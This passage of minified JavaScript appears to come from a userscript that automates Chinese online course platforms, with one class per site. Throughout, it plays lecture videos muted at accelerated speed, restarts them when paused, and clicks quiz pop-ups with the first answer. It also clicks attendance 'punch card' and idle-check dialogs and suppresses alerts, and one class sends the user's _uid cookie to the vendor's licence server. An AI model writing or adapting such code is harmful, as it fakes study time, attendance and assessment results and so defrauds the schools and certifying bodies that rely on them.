                await sleep(1500), this.currentIndex >= ElementObj.$allTask.length - 1 && (this.parentIndex += 1, await sleep(200), ElementObj.$parentNodes[this.parentIndex].querySelector(".left-img").click(), this.parentIndex >= ElementObj.$parentNodes.length - 1) ? alert("\u8bfe\u7a0b\u5df2\u5168\u90e8\u64ad\u653e\u5b8c\u4e86") : (e = document.querySelector(".videoleft img"), await sleep(200), e.click(), showTip("\u6b63\u5728\u5207\u6362\u8bfe\u7a0b", 3e3), setTimeout(async () => {
                    this.currentIndex += 1;
                    var e = ElementObj.$allTask[this.currentIndex];
                    await sleep(2e3), e?.click(), setTimeout(() => {
                        this._o1()
                    }, 5e3)
                }, 5500))
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.play()
                }, 4e3)
            })
        }

        getVideoDom() {
            return new Promise(e => {
                let t = setInterval(() => {
                    ElementObj.$video = document.querySelector("video"), ElementObj.$video && (clearInterval(t), e(!0))
                }, 1e3)
            })
        }
    }

    class guojiazhihuijiaoyu extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        _init() {
            let t = setInterval(async () => {
                var e = document.querySelectorAll(".video-title .four");
                e.length && (clearInterval(t), ElementObj.$handleSpeedUp.style.display = "none", ElementObj.$allTask = e, this.getCurrentIndex())
            }, 1e3)
        }

        getCurrentIndex() {
            ElementObj.$allTask.forEach((e, t) => {
                "100%" != e.innerText && -1 == this.currentIndex && (this.currentIndex = t)
            }), -1 == this.currentIndex && (this.currentIndex = 0), showTip("🔉🔉🔉\u521d\u59cb\u5316\u5b8c\u6210，\u5373\u5c06\u5f00\u59cb\u81ea\u52a8\u64ad\u653e", 3e3), this._o1()
        }

        async play() {
            var e = ElementObj.$allTask[this.currentIndex];
            await sleep(300), e.click(), await sleep(3e3), document.querySelector("video").volume = 0;
            document.querySelector(".xgplayer-icon-play").click(), await this.getVideoDom(), ElementObj.$video.play(), ElementObj.$video.playbackRate = toolOption.accelerator, this.listenVidoeStatus();
            e = document.querySelector(".layui-layer-btn0");
            e && e.click(), ElementObj.$handleSpeedUp.style.background = "#f01414", ElementObj.$handleSpeedUp.innerText = "\u52a0\u901f\u6210\u529f", this.listenTopic(), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 1500)
            }), ElementObj.$video.addEventListener("ended", async () => {
                var e = document.querySelector(".layui-layer-btn0");
                await sleep(3e3), e && e.click(), this.currentIndex += 1, setTimeout(() => {
                    this._o1()
                }, 5e3)
            })
        }

        listenTopic() {
            setInterval(() => {
                try {
                    document.querySelector("#submit") && this.answerTopic()
                } catch (e) {
                }
            }, 5e3)
        }

        async answerTopic() {
            var e = document.querySelectorAll(".choice li")[0];
            await sleep(200), e.click();
            let t = document.querySelector("#submit");
            await sleep(1e3), t.click(), await sleep(2e3), t = document.querySelector("#submit"), await sleep(200), t.click(), await sleep(4500);
            e = document.querySelector(".layui-layer-btn0");
            await sleep(200), e.click()
        }

        listenVidoeStatus() {
            this.timer = setInterval(() => {
                ElementObj.$video = document.querySelector("video"), ElementObj.$video && ElementObj.$video.paused && (ElementObj.$video.setAttribute("muted", "muted"), ElementObj.$video.volume = 0, ElementObj.$video.play())
            }, 1e4)
        }
    }

    class lanzhouchengren extends Main {
        constructor() {
            super(), this.taskLength = 0, this.parentIndex = -1, this.currentIndex = -1, this.videoplaying = 3, this.loadedCount = 0, this.type = 1, this._init()
        }

        _init() {
            let e = setInterval(() => {
                "/courseVideo/index" == location.pathname ? ElementObj.$allTask = document.querySelectorAll(".ant-tree-node-content-wrapper-normal .chapter-tree-level2") : ElementObj.$allTask = document.querySelectorAll(".activity li"), ElementObj.$allTask.length && (clearInterval(e), this.getCurrentIndex())
            }, 1e3)
        }

        async getCurrentIndex() {
            if ("/courseVideo/index" == location.pathname) {
                for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) {
                    var t = ElementObj.$allTask[e].querySelector(".right");
                    if (!t) {
                        this.currentIndex = e;
                        break
                    }
                    if ("\u5df2\u5b8c\u6210" != t.querySelector(".percent-text").innerText) {
                        this.currentIndex = e;
                        break
                    }
                }
                if (-1 == this.currentIndex) return void alert("\u6240\u6709\u8bfe\u7a0b\u5df2\u64ad\u653e\u5b8c");
                ElementObj.$allTask[e].click()
            } else ElementObj.$allTask.forEach((e, t) => {
                e.classList.contains("cur") && (this.currentIndex = t)
            }), -1 == this.currentIndex && (this.currentIndex = 0);
            ElementObj.$handleSpeedUp.style.display = "none", showTip("🔉\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3), await sleep(3e3), this._o1()
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer);
            var e = await this.getVideoDom();
            await sleep(200), 1 == e && setTimeout(async () => {
                this.currentIndex += 1;
                var e = ElementObj.$allTask[this.currentIndex]?.querySelector("h3");
                await sleep(2e3), e?.click()
            }, 3e3), 2 == e && (ElementObj.$video.volume = 0, ElementObj.$video.playbackRate = toolOption.accelerator, ElementObj.$video.play(), ElementObj.$handleSpeedUp.style.background = "#f01414", ElementObj.$handleSpeedUp.innerText = "\u52a0\u901f\u6210\u529f", "/venus/study/activity/video/study.do" == location.pathname && (this.listenVidoeStatus(ElementObj.$video, () => {
                (ElementObj.$allTask[this.currentIndex]?.querySelector("h3"))?.click()
            }), this.reloadPage()), ElementObj.$video.addEventListener("ended", async () => {
                this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                this.videoplaying = 1, setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 1e3)
            }), ElementObj.$video.addEventListener("playing", () => {
                this.videoplaying = 2
            }))
        }

        async playNext() {
            if (this.videoplaying = 3, await sleep(1500), this.currentIndex >= ElementObj.$allTask.length - 1) alert("\u5f53\u524d\u7ae0\u8282\u8bfe\u7a0b\u5df2\u5168\u90e8\u64ad\u653e\u5b8c\u4e86"); else {
                this.currentIndex += 1;
                var t = ElementObj.$allTask[this.currentIndex];
                let e;
                "/courseVideo/index" == location.pathname ? ((e = t)?.click(), setTimeout(() => {
                    this._o1()
                }, 3e3)) : (e = t?.querySelector("h3"), await sleep(2e3), e?.click())
            }
        }

        getVideoDom() {
            return new Promise(e => {
                let t = setInterval(() => {
                    ElementObj.$video = document.querySelector("video"), ElementObj.$myFrame = document.querySelector("#myFrame"), ElementObj.$video && (clearInterval(t), this.type = 2, e(2)), ElementObj.$myFrame && (clearInterval(t), this.type = 1, e(1))
                }, 1e3)
            })
        }

        async reloadPage() {
            let e = 600, t = 0, l = setInterval(() => {
                (t += 1) % 15 == 0 && console.clear(), t, e <= 0 && (clearInterval(l), location.reload()), --e
            }, 1e3)
        }
    }

    class tsbtchinamde extends Main {
        constructor() {
            super(), this.taskLength = 0, this.studyType = 1, this.currentIndex = -1, this._init()
        }

        _init() {
            let l = setInterval(async () => {
                var e = document.querySelectorAll(".chapterlist .item p"),
                    t = document.querySelectorAll(".chapterlist .chapter-li .drop p");
                (e.length || t.length) && (clearInterval(l), ElementObj.$allTask = t.length ? t : e, this.getCurrentIndex(), ElementObj.$handleSpeedUp.style.display = "none")
            }, 1e3)
        }

        async getCurrentIndex() {
            let l = [];
            ElementObj.$allTask.forEach((e, t) => {
                var e = e.querySelector(".class_percent");
                e ? (e = e.innerText, l.push(parseInt(e))) : l.push(0)
            }), l.reverse();
            for (var e = 0; e <= l.length - 1; e++) if (l[e] < 98) {
                this.currentIndex = l.length - e - 1;
                break
            }
            if (0 == this.currentIndex) {
                ElementObj.$allTask[1].querySelector("a").click(), await sleep(4e3), ElementObj.$allTask = document.querySelectorAll(".chapterlist .drop p"), await sleep(200);
                var t = ElementObj.$allTask[0].querySelector(".class_percent").innerText;
                if (!(parseInt(t) < 98)) return void alert("\u5f53\u524d\u79d1\u76ee\u8bfe\u7a0b\u5df2\u5168\u90e8\u64ad\u653e\u5b8c");
                this.currentIndex = 0
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u79d1\u76ee\u8bfe\u7a0b\u5df2\u5168\u90e8\u64ad\u653e\u5b8c") : (ElementObj.$handleSpeedUp.style.display = "none", showTip("🔉🔉🔉\u521d\u59cb\u5316\u5b8c\u6210，5s\u540e\u5f00\u59cb\u64ad\u653e", 3e3), this._o1())
        }

        getVideoDom() {
            return new Promise(e => {
                let t = setInterval(() => {
                    ElementObj.$video = document.querySelector("video"), ElementObj.$video.src ? (clearInterval(t), e(1)) : (clearInterval(t), e(2))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.timer);
            var e = ElementObj.$allTask[this.currentIndex].querySelector("a"),
                e = (await sleep(300), e.click(), this.studyType = await this.getVideoDom(), 1 == this.studyType && (ElementObj.$video.volume = 0, ElementObj.$video.setAttribute("muted", "muted"), await sleep(200), ElementObj.$video.play(), ElementObj.$video.playbackRate = toolOption.accelerator, ElementObj.$handleSpeedUp.style.background = "#f01414", ElementObj.$handleSpeedUp.innerText = "\u52a0\u901f\u6210\u529f", this.listenVidoeStatus(ElementObj.$video, () => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                })), 1 == this.studyType ? $el("#player") : $el("#thirdplayer"));
            this.changeHtml(e), this.reloadPage(), this.listenPageHide(), 1 == this.studyType ? this.listenAbnormal(1) : this.listenAbnormal(0), setTimeout(() => {
                this.addInfo("⚠️⚠️⚠️\u8bfe\u7a0b\u91c7\u7528\u5012\u7740\u64ad\u653e，\u8bf7\u52ff\u624b\u52a8\u66f4\u6362\u8bfe\u7a0b", 0)
            }, 1e3), ElementObj.$video.addEventListener("ended", async () => {
                location.reload()
            })
        }

        async reloadPage() {
            let e = 360, t = setInterval(() => {
                e <= 0 && (clearInterval(t), location.reload()), --e
            }, 1e3)
        }

        listenAbnormal(t) {
            showTip("🔉\u8bfe\u4ef6\u6b63\u5728\u5b66\u4e60，\u8bf7\u52a1\u70b9\u51fb\u6216\u957f\u65f6\u95f4\u9690\u85cf");
            let l = 0;
            setInterval(() => {
                l += 1, 0 == t && this.addInfo(`\u540e\u53f0\u5b66\u4e60${l}\u6b21，\u5f53\u524d\u72b6\u6001\u6b63\u5728\u5b66\u4e60`), 1 == t && (e = (ElementObj.$video.currentTime / 60).toFixed(2), this.addInfo(`\u540e\u53f0\u5b66\u4e60${l}\u6b21，\u5f53\u524d\u72b6\u6001\u6b63\u5728\u5b66\u4e60，\u5df2\u64ad\u653e${e}\u5206\u949f`));
                var e = document.querySelector(".layui-layer-btn0");
                e && location.reload()
            }, 5e3)
        }
    }

    tsbtchinamde.ctxid = 26;

    class lzrejxjy extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let r = setInterval(async () => {
                try {
                    if (ElementObj.$handleSpeedUp.style.display = "none", document.querySelector("#learnHelperIframe")?.contentDocument?.querySelector(".btn-icon.shut-btn")?.click(), ElementObj.$allTask = document.querySelectorAll(".review-thumbs-cell[id]"), "live.webtrn.cn" === location.host && ElementObj.$allTask.length) {
                        clearInterval(r);
                        for (let e = 0; e < ElementObj.$allTask.length; e++) {
                            var t = ElementObj.$allTask[e];
                            if ("\u6709\u6548\u5b66\u4e60：100%" != t.querySelector("div[name]").innerText) {
                                this.currentIndex = e, t.querySelector(".thumb-wrap")?.classList.contains("isPlaying") || (t.click(), await MyTool.sleep(2e3)), this._o1();
                                break
                            }
                        }
                        return this._o1()
                    }
                    var e = document.querySelectorAll(".my-center2RM .pull-left a.trans")[1];
                    if (e) clearInterval(r), GM_setValue("homeUrl", location.href), e?.click(), showTip("🔉\u6b63\u5728\u521d\u59cb\u5316"), await sleep(2e3), ElementObj.$parentNodes = document.querySelectorAll(".class2Li"), this.findParentIndex(); else {
                        var l = document.querySelectorAll(".learn-menu-cell"),
                            n = document.querySelector(".contentIframe")?.contentDocument?.querySelectorAll(".s_point"),
                            a = document.querySelector("iframe#mainCont")?.contentDocument?.querySelectorAll(".s_point");
                        if (ElementObj.$allTask = n || a || [], ElementObj.$allTask.length || l.length) {
                            clearInterval(r);
                            var i = document.cookie.split("; ").find(e => e.startsWith("_uid=")).replace("_uid=", ""),
                                o = await MyTool.axfedata({
                                    url: _b + "/order/checkUseAccount?toolkey=" + MyTool.getValue("mytoolkey") + "&account=" + i + "&type=2",
                                    method: "GET"
                                });
                            if (200 !== o.code) return alert(o.message);
                            this.getCurrentIndex()
                        }
                    }
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            ["jxzj-kfkc.webtrn.cn", "zjdx-kfkc.webtrn.cn", "cadxxl-kfkc.webtrn.cn"].includes(location.host) || ((e = document.querySelectorAll(".learn-menu-cell")[1]).classList.contains("learn-menu-cur") || e.querySelector("a").click(), await sleep(3e3));
            for (var e = "cadxxl-kfkc.webtrn.cn" == location.host ? document.querySelector("iframe#mainCont") : document.querySelector(".contentIframe"), t = (ElementObj._document = e.contentDocument, ElementObj.$allTask = ElementObj._document.querySelectorAll(".s_point"), showTip("\u6b63\u5728\u521d\u59cb\u5316"), ElementObj.$handleSpeedUp.style.display = "none", 0); t <= ElementObj.$allTask.length - 1; t++) if (!ElementObj.$allTask[t].querySelector(".item_done_icon").classList.contains("done_icon_show")) {
                this.currentIndex = t;
                break
            }
            -1 == this.currentIndex ? (e = GM_getValue("homeUrl", null), GM_openInTab(e, {active: !0}), setTimeout(() => {
                window.close()
            }, 1500)) : (ElementObj.$allTask[this.currentIndex]?.click(), showTip("\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e"), this._o1())
        }

        async findParentIndex() {
            ElementObj.$handleSpeedUp.style.display = "none";
            let n;
            ElementObj.$parentNodes.forEach((e, t) => {
                var l = e.querySelector(".color-theme").innerText;
                parseInt(l) <= 98 && -1 == this.currentIndex && (this.currentIndex = t, n = e.querySelector("a.btn-theme"))
            }), -1 == this.currentIndex ? alert("\u5168\u90e8\u8bfe\u7a0b\u5df2\u5b66\u5b8c") : (n.click(), setTimeout(() => {
                window.close()
            }, 1500))
        }

        getVideoDom() {
            return new Promise(t => {
                let l = 0, n = setInterval(() => {
                    7 < l && (clearInterval(n), t(2));
                    var e = document.querySelector("#replayFrame");
                    e ? (clearInterval(n), ElementObj.$video = e.contentDocument.querySelector("video"), t(1)) : (e = document.querySelector(".remind")) && e.innerText.trim().includes("\u5f00\u64ad\u63d0\u9192") ? (clearInterval(n), window.close()) : (e = ElementObj._document.querySelector("#mainFrame")?.contentWindow.document, ElementObj.$video = e?.querySelector("video"), ElementObj.$video && (clearInterval(n), t(1)), e.querySelector(".space-entry-btn") && (clearInterval(n), e.querySelector(".spacefont-seal-done") || e.querySelector(".space-entry-btn").click(), t(2)), l += 1)
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime);
            var e = await this.getVideoDom();
            2 == e && this.playNext(), 1 == e && (ElementObj.$video.volume = 0, ElementObj.$video.setAttribute("muted", "muted"), await sleep(200), ElementObj.$video.play(), ElementObj.$video.playbackRate = toolOption.accelerator, this.listenRebort(), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), ElementObj.$video.addEventListener("ended", async () => {
                this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }))
        }

        updateSpeedElement(e) {
            localStorage.setItem("_localSpeed", e.toString()), ElementObj.$video.playbackRate = e
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
                let e = document.querySelector(".layui-layer-btn0");
                e && setTimeout(() => {
                    e.click(), ElementObj.$video.play()
                }, 2e3)
            }, 1e4)
        }

        async playNext() {
            var e;
            "live.webtrn.cn" === location.host ? this.currentIndex > ElementObj.$allTask.length - 1 ? window.close() : (this.currentIndex += 1, await MyTool.sleep(3500), this._o1()) : this.currentIndex >= ElementObj.$allTask.length - 1 ? (e = GM_getValue("homeUrl", null), GM_openInTab(e, {active: !0}), setTimeout(() => {
                window.close()
            }, 1500)) : (this.currentIndex += 1, ElementObj.$allTask[this.currentIndex].click(), showTip("🔉\u6b63\u5728\u5207\u6362\u8bfe\u7a0b"), await MyTool.sleep(3500), this._o1())
        }
    }

    lzrejxjy.ctxid = 29;

    class xuzhouyikedaxue extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this.parentIndex = -1, this._init()
        }

        async _init() {
            let t = setInterval(async () => {
                try {
                    var e = document.querySelector("#courseware_main_menu").querySelector("a");
                    e && (clearInterval(t), e.click(), this.findParentIndex())
                } catch (e) {
                }
            }, 1e3)
        }

        async findParentIndex() {
            showTip("🔉\u6b63\u5728\u521d\u59cb\u5316", 2500), await sleep(4500), ElementObj.$handleSpeedUp.style.display = "none";
            var e = document.querySelector(".contentIframe").contentWindow.document;
            ElementObj.$parentNodes = e.querySelectorAll(".vcon li"), ElementObj.$parentNodes.forEach((e, t) => {
                e = e.querySelector("span");
                (e.classList.contains("undo") || e.classList.contains("doing")) && -1 == this.parentIndex && (this.parentIndex = t)
            }), -1 == this.parentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u5df2\u5168\u90e8\u64ad\u53d1\u5b8c") : (ElementObj.$parentNodes[this.parentIndex].querySelector("a").click(), this.getCurrentIndex())
        }

        async getCurrentIndex() {
            showTip("\u6b63\u5728\u521d\u59cb\u5316", 2500), await sleep(4500);
            var e = document.querySelector(".contentIframe");
            ElementObj._document = e.contentWindow.document, ElementObj.$allTask = ElementObj._document.querySelectorAll(".menub"), this.currentIndex = 0, ElementObj.$allTask[this.currentIndex]?.click(), showTip("\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e"), this._o1()
        }

        getVideoDom() {
            return new Promise(t => {
                let l = setInterval(() => {
                    var e = document.querySelector(".contentIframe"),
                        e = (ElementObj._document = e.contentWindow.document, ElementObj._document.querySelector("#mainFrame").contentDocument);
                    ElementObj.$video = e.querySelector("video"), ElementObj.$video ? (clearInterval(l), t(1)) : (e.querySelector("#content_frame"), clearInterval(l), t(2))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime), clearInterval(this.timer2), unsafeWindow.alert = () => {
            };
            var e = await this.getVideoDom();
            this.listenRebort(), 1 == e && (ElementObj.$video.volume = 0, await sleep(200), ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                    ElementObj.$video.playbackRate = toolOption.accelerator
                }, 3e3)
            }), ElementObj.$video.addEventListener("ended", async () => {
                await sleep(3e3), this.playNext()
            })), 2 == e && (this.timer2 = setTimeout(() => {
                this.playNext()
            }, 7e3))
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
                var e = document.querySelector(".layui-layer-btn a");
                e && (e.click(), ElementObj.$video.play(), setTimeout(() => {
                    ElementObj.$video.playbackRate = toolOption.accelerator
                }, 3e3))
            }, 1e4)
        }

        async playNext() {
            showTip("✅✅✅\u64ad\u653e\u5b8c\u6210，\u6b63\u5728\u5207\u6362\u8bfe\u7a0b", 3500), this.currentIndex >= ElementObj.$allTask.length - 1 ? (this.parentIndex += 1, ElementObj.$parentNodes[this.parentIndex].querySelector("a").click(), setTimeout(() => {
                this.getCurrentIndex()
            }, 4500)) : (this.currentIndex += 1, ElementObj.$allTask[this.currentIndex].click(), setTimeout(() => {
                this._o1()
            }, 4e3))
        }
    }

    xuzhouyikedaxue.ctxid = 26;

    class xibeisfzyjy extends Main {
        constructor() {
            super(), this.studyType = 2, this.taskLength = 0, this.parentIndex = -1, this.currentIndex = -1, this.swiperIndex = -1, this._init()
        }

        async _init() {
            let n = setInterval(async () => {
                try {
                    var e = document.querySelectorAll(".el-tree-node"),
                        t = document.querySelectorAll(".m-chapterList .section"),
                        l = ((e.length || t.length) && (this.studyType = e.length ? 2 : 1, ElementObj.$allTask = e.length ? e : t, clearInterval(n), this.getCurrentIndex()), ElementObj.$parentNodes = document.querySelectorAll(".project-courseBottom"), ElementObj.$parentNodes.length && (clearInterval(n), this.getParentIndex()), location.host);
                    "preview.dccloud.com.cn" == l && (clearInterval(n), await sleep(1500), window.close())
                } catch (e) {
                }
            }, 1e3)
        }

        getParentIndex() {
            for (var e = 0; e <= ElementObj.$parentNodes.length - 1; e++) if ("\u5df2\u5b66\u4e60" != ElementObj.$parentNodes[e].querySelector("span")) {
                this.parentIndex = e;
                break
            }
            -1 == this.parentIndex && alert("\u8bfe\u7a0b\u5df2\u5168\u90e8\u5b66\u5b8c"), ElementObj.$parentNodes[e].querySelector(".project-courseButton").click()
        }

        async getSwiperIndex() {
            if (ElementObj.$video = document.querySelector("video"), await sleep(200), ElementObj.$video) if (ElementObj.$swiperItem = document.querySelectorAll(".public-articleSlideList"), ElementObj.$swiperItem.length) {
                for (var e, t = 0; t <= ElementObj.$swiperItem.length - 1; t++) if ("\u5df2\u5b66\u4e60" != ElementObj.$swiperItem[t].querySelector(".video-status").innerText) {
                    this.swiperIndex = t;
                    break
                }
                -1 == this.swiperIndex ? this.playNext() : 0 == this.swiperIndex ? this._o1() : (ElementObj.$swiperItem[this.swiperIndex].querySelector(".el-icon-video-play").click(), showTip("⚠️⚠️⚠️\u6b63\u5728\u521d\u59cb\u5316", 3500), e = document.querySelector(".el-message-box__btns")?.lastChild, await sleep(2e3), e.click(), setTimeout(() => {
                    this._o1()
                }, 5e3))
            } else this._o1(); else ElementObj.$docs = document.querySelectorAll(".abcd"), ElementObj.$docs.length && this.playDoc()
        }

        async getCurrentIndex() {
            ElementObj.$handleSpeedUp.style.display = "none", showTip("\u6b63\u5728\u521d\u59cb\u5316", 2500), await sleep(3500);
            let l = 1 == this.studyType ? "section-cur" : "study";
            ElementObj.$allTask.forEach((e, t) => {
                1 == this.studyType && e.classList.contains(l) && (this.currentIndex = t), 2 == this.studyType && "\u5df2\u5b66\u4e60" != e.querySelector("i").title && -1 == this.currentIndex && (this.currentIndex = t)
            }), -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u7ae0\u8282\u5df2\u5168\u90e8\u64ad\u653e\u5b8c") : (2 == this.studyType && -1 != this.currentIndex && this.playNext(this.currentIndex - 1), showTip("⚠️⚠️⚠️\u521d\u59cb\u5316，\u8bf7\u7a0d\u540e", 3e3), 1 == this.studyType && this._o1(), 2 == this.studyType && this.getSwiperIndex())
        }

        getVideoDom() {
            return new Promise(e => {
                let t = setInterval(() => {
                    ElementObj.$video = document.querySelector("video"), ElementObj.$video && (clearInterval(t), e(!0))
                }, 1e3)
            })
        }

        async play() {
            if (clearInterval(this.listenVidoeStatusTimer), clearInterval(this.timer), await this.getVideoDom(), ElementObj.$video.volume = 0, ElementObj.$video.setAttribute("muted", "muted"), await sleep(200), ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), 2 == this.studyType) {
                let e = await this.getDocIndex();
                setTimeout(() => {
                    this.eachPlayDoc(e)
                }, 3e3), this.changeHtml($el("#video")), this.listenPageHide(), this.listenPlayTime(), this.reloadPage()
            }
            this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                    ElementObj.$video.playbackRate = toolOption.accelerator
                }, 3e3)
            }), ElementObj.$video.addEventListener("ended", async () => {
                var e;
                showTip("🔉\u6b63\u5728\u5207\u6362\u8bfe\u7a0b", 2500), 2 == this.studyType && (this.swiperIndex >= ElementObj.$swiperItem.length - 1 ? location.reload() : (this.swiperIndex += 1, ElementObj.$swiperItem[this.swiperIndex].querySelector(".el-icon-video-play").click(), showTip("⚠️⚠️⚠️\u6b63\u5728\u5207\u6362\u89c6\u9891", 5e3), e = document.querySelector(".el-message-box__btns")?.lastChild, await sleep(2e3), e.click(), setTimeout(() => {
                    this._o1()
                }, 5e3))), 1 == this.studyType && (this.currentIndex >= ElementObj.$allTask.length - 1 ? alert("\u5f53\u524d\u7ae0\u8282\u8bfe\u7a0b\u5df2\u5b66\u5b8c") : (this.currentIndex += 1, ElementObj.$allTask[this.currentIndex].querySelector("a")?.click()))
            })
        }

        async getDocIndex() {
            ElementObj.$docs = document.querySelectorAll(".abcd .file-box"), await sleep(200);
            let e = -1;
            for (var t = 0; t <= ElementObj.$docs.length - 1; t++) if ("( \u5df2\u5b8c\u6210 )" != ElementObj.$docs[t].querySelector(".fs12").innerText) {
                e = t;
                break
            }
            return e
        }

        async playDoc(e) {
            var t = await this.getDocIndex();
            -1 == t ? this.playNext() : this.eachPlayDoc(t, () => {
                setTimeout(async () => {
                    this.playNext()
                }, 2e3)
            })
        }

        eachPlayDoc(t = 0, l) {
            if (-1 != t) {
                let e = setInterval(() => {
                    t >= ElementObj.$docs.length - 1 && (clearInterval(e), "function" == typeof l) && l(), ElementObj.$docs[t].querySelector("button").click(), t += 1
                }, 2e3)
            }
        }

        async playNext(e) {
            null != e && (this.currentIndex = e), this.currentIndex >= ElementObj.$allTask.length - 1 ? alert("\u5f53\u524d\u7ae0\u8282\u8bfe\u7a0b\u5df2\u5b66\u5b8c") : (this.currentIndex += 1, ElementObj.$allTask[this.currentIndex].querySelectorAll("span")[1]?.click(), await sleep(2e3), (e = document.querySelector(".el-message-box__btns")?.lastChild) && e.click(), showTip("⚠️⚠️⚠️\u6b63\u5728\u5207\u6362\u4e0b\u4e00\u8282", 4e3), setTimeout(() => {
                this.getSwiperIndex()
            }, 4500))
        }

        listenPlayTime() {
            showTip("🔉\u8bfe\u4ef6\u6b63\u5728\u5b66\u4e60，\u8bf7\u52a1\u70b9\u51fb\u6216\u957f\u65f6\u95f4\u9690\u85cf");
            let t = 0;
            this.timer = setInterval(() => {
                t += 1;
                var e = (ElementObj.$video.currentTime / 60).toFixed(2);
                this.addInfo(`\u540e\u53f0\u5b66\u4e60${t}\u6b21，\u5f53\u524d\u72b6\u6001\u6b63\u5728\u5b66\u4e60，\u5df2\u64ad\u653e${e}\u5206\u949f`)
            }, 5e3)
        }

        async reloadPage() {
            let e = 360, t = setInterval(() => {
                e <= 0 && (clearInterval(t), location.reload()), --e
            }, 1e3)
        }
    }

    xibeisfzyjy.ctxid = 26;

    class henangongshe extends Main {
        constructor() {
            super(), this.taskLength = 0, this.parentIndex = -1, this.currentIndex = -1, this.videoplaying = -1, this.timer = null, this._init()
        }

        async _init() {
            let t = setInterval(async () => {
                var e = document.querySelectorAll("#bxkBtudyDiv a");
                e.length && (clearInterval(t), this.getParentIndex(e)), ElementObj.$allTask = document.querySelectorAll(".course-info .video-title"), ElementObj.$allTask.length && (clearInterval(t), this.getCurrentIndex()), ElementObj.$handleSpeedUp.style.display = "none"
            }, 1e3)
        }

        async getParentIndex(e) {
            e[0].click(), showTip("⚠️⚠️⚠️\u6b63\u5728\u521d\u59cb\u5316", 3e3), await sleep(3e3), ElementObj.$parentNodes = document.querySelectorAll("tbody tr");
            for (var t = 0; t <= ElementObj.$parentNodes.length - 1; t++) {
                var l = ElementObj.$parentNodes[t].querySelector("span").innerText;
                if (parseInt(l) <= 98) {
                    this.parentIndex = t;
                    break
                }
            }
            if (-1 == this.parentIndex) {
                e[1].click(), await sleep(3e3), ElementObj.$parentNodes = document.querySelectorAll("tbody tr");
                for (t = 0; t <= ElementObj.$parentNodes.length - 1; t++) {
                    var n = ElementObj.$parentNodes[t].querySelector("span").innerText;
                    if (parseInt(n) <= 98) {
                        this.parentIndex = t;
                        break
                    }
                }
            }
            -1 == this.parentIndex ? alert("\u5168\u90e8\u8bfe\u7a0b\u5df2\u5b66\u5b8c") : (GM_setValue("homeUrl", location.href), ElementObj.$parentNodes[this.parentIndex].querySelector("button").click(), setTimeout(() => {
                window.close()
            }, 5500))
        }

        async getCurrentIndex() {
            showTip("⚠️⚠️⚠️\u6b63\u5728\u521d\u59cb\u5316", 3500), ElementObj.$allTask.forEach((e, t) => {
                "100%" != e.querySelector(".four").innerText && -1 == this.currentIndex && (this.currentIndex = t)
            }), ElementObj.$handleSpeedUp.style.display = "none", showTip("🔉\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3);
            var e = ElementObj.$allTask[this.currentIndex];
            await sleep(200), e.click(), setTimeout(() => {
                this._o1()
            }, 4500)
        }

        getVideoDom() {
            return new Promise(e => {
                let t = setInterval(() => {
                    ElementObj.$video = document.querySelector("video"), ElementObj.$video && (clearInterval(t), e(!0))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), await this.getVideoDom(), ElementObj.$video.setAttribute("muted", "muted"), ElementObj.$video.volume = 0;
            var e = document.querySelector(".xgplayer-start");
            await sleep(200), e.click(), ElementObj.$video.playbackRate = toolOption.accelerator, ElementObj.$handleSpeedUp.style.background = "#f01414", ElementObj.$handleSpeedUp.innerText = "\u52a0\u901f\u6210\u529f", this.punchCard(), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), ElementObj.$video.addEventListener("ended", async () => {
                var e;
                this.currentIndex >= ElementObj.$allTask.length - 1 ? (setTimeout(() => {
                    window.close()
                }, 1500), e = GM_getValue("homeUrl", null), GM_openInTab(e, {active: !0})) : (this.currentIndex += 1, e = ElementObj.$allTask[this.currentIndex], await sleep(300), e.click(), setTimeout(() => {
                    this._o1()
                }, 4500))
            })
        }

        punchCard() {
            setInterval(() => {
                var e = document.querySelector("#comfirmClock");
                e && e.click()
            }, 5e3)
        }

